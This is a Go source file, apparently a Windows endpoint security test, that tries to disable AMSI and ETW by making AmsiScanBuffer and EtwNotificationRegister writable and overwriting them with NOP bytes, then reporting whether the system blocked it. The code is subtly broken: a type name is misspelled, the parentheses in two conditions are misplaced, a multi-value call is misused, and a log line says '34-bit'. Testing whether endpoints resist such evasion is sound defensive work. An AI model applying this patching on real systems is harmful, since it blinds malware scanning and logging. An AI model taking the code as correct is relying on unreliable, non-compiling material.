//go:build windows
// +build windows

/*
ID: 395d0e4c-e7f5-4c77-add7-92b1d2ba169e
NAME: AMSI and ETW Patching
CREATED: 2024-06-
scenario: patching (overwriting) AmsiScanBuffer + EtwNotificationRegister can allow attackers to bypass these detections

*/

package main

import (
	"fmt"
	"syscall"
	"unsafe"

	Endpoint "github.com/preludeorg/test/endpoint"
)

/*
load `kernel32.dll`
reference required procedures: 
`LoadLibraryA`
`GetProcAddress`
`VirtualProtect`
`GetCurrentProcess`
`WriteProcessMemory`
`GetModuleHandleA`
*/

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	procLoadLibraryA = kernel32.NewProc("LoadLibraryA")
	procGetProcAddress = kernel32.NewProc("GetProcAddress")
	procVirtualProtect = kernel32.NewProc("VirtualProtect")
	procGetCurrentProcess = kernel32.NewProc("GetCurrentProcess")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procGetModuleHandleA = kernel32.NewProc("GetModuleHandleA")
	PAGE_EXECUTE_READWRITE = uintptr(0x40)
	OLD_PROTECTION = uintptr(0)
	// NOP patches
	patch32bit = []byte{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}
	patch64bit = []byte{0x90, 0x90, 0x90, 0x90, 0x90, 0x90}
)

// load `amsi.dll` + `ntdll` using `LoadLibraryA`
func loadLibraryA(libName string) uintptr {
	lib, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(syscall.StringBytePtr(libName))))
	return lib
}

// retrieve mem address of `AmsiScanBuffer` + `EtwNotificationAddress` using `GetProcAddress`
func getProcAddress(module uintptw, procName string) uintptr {
	addr, _, _ := procGetProcAddress.Call(module, uintptr(unsafe.Pointer(syscall.StringBytePtr(procName))))
	return addr
}

func virtualProtect(addr uintptr, size uintptr, newProtect uintptr, oldProtect *uintptr) bool {
	ret, _, _ := procVirtualProtect.Call(addr, size, newProtect, uintptr(unsafe.Pointer(oldProtect)))
	return ret != 0
}

func writeProcessMemory(process uintptr, baseAddress uintptr, buffer []byte, size uintptr, written *uintptr) bool {
	ret, _, _ := procWriteProcessMemory.Call(process, baseAddress, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(written)))
	return ret != 0
}

func main() {
	Endpoint.Say("testing AMSI + ETW patching...")

	libAmsi := loadLibraryA("amsi.dll")
	libNtdll := loadLibraryA("ntdll.dll")

	if libAmsi == 0 || libNtdll == 0 {
		Endpoint.Say("failed to load required libraries")
		Endpoint.Stop(1) // error
	}

	amsiAddr := getProcAddress(libAmsi, "AmsiScanBuffer")
	etwAddr := getProcAddress(libNtdll, "EtwNotificationRegister")

	if amsiAddr == 0 || etwAddr == 0 {
		Endpoint.Say("failed to get addresses")
		Endpoint.Stop(1) // error
	}

	// determine patch type
	patch := patch32bit
	if unsafe.Sizeof(uintptr(0)) == 8 {
		Endpoint.Say("using 64-bit patch...")
		patch = patch64bit
	} else {
		Endpoint.Say("using 34-bit patch...")
	}

	/*
	change memory protection for functions
	using `VirtualProtect`, change protection to PAGE_EXECUTE_READWRITE
	*/

	if !virtualProtect(amsiAddr, uintptr(len(patch)), PAGE_EXECUTE_READWRITE, &OLD_PROTECTION || !virtualProtect(etwAddr, uintptr(len(patch)), PAGE_EXECUTE_READWRITE, &OLD_PROTECTION)) {
		Endpoint.Say("failed to change memory protection")
		Endpoint.Stop(15) // PROTECTED
	}

	/*
	write NOP patch to memory using `WriteProcessMemory`
	this disables the functions
	*/
	var written uintptr
	if !writeProcessMemory(procGetCurrentProcess.Call(), amsiAddr, patch, uintptr(len(patch)), &written || !writeProcessMemory(procGetCurrentProcess.Call(), etwAddr, patch, uintptr(len(patch)), &written) {
		Endpoint.Say("failed to write to memory")
		Endpoint.Stop(15) // PROTECTED
	}

	Endpoint.Say("patched AmsiScanBuffer + EtwNotificationRegister")
	Endpoint.Stop(101) // UNPROTECTED
}
